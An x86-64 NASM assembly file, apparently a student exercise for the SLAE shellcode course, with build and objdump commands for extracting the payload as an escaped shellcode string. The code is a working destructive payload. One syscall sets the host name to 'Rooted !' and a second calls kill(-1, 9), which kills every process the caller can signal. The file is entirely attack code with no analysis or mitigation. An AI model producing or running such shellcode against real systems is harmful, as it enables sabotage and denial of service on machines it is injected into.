; Filename:      shellcode-orig-asm.nasm
; Author:        Nicolas Barrière
; Student ID:    SLAE - 1398
; Created Date:  09.02.2019
; Note:          x64
; Assembler:     nasm -f elf64 shellcode-orig-asm.nasm -o shellcode-orig-asm.o
; Linker:        ld -m elf_x86_64 shellcode-orig-asm.o -o shellcode-orig-asm
; Assembly dump: objdump -d ./shellcode-orig-asm|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

global _start

_start:

	mov al,0xaa
	mov r8,0x21206465746f6f52
	push r8
	mov rdi,rsp
	mov sil,0x8
	syscall

	push byte +0x3e
	pop rax
	push byte -0x1
	pop rdi
	push byte +0x9
	pop rsi
	syscall
